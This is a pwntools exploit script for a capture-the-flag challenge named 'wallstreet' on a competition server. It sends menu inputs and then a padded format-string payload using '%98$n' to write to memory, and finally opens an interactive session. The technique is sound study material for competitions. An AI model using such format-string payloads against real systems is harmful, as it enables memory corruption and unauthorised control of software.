#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('././wallstreet')
context.terminal = ['kitty', '-e', 'sh', '-c']
host = args.HOST or 'pwn.2021.chall.actf.co'
port = int(args.PORT or 21800)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *0x4014A7
set backtrace limit 1
'''.format(**locals())
# b'PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP%98$n' 
# -- Exploit goes here --
io = start()
io.recv()
io.sendline("1")
io.recv()
io.sendline("-")
io.recv()
payload = f"PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP%98$n"
# pause()
io.send(payload)
kek = io.recv()
print(kek)
io.interactive()

#47:0238│      0x7ffdfa1e8d38 —▸ 0x401557 (main+154) ◂— mov    eax, 0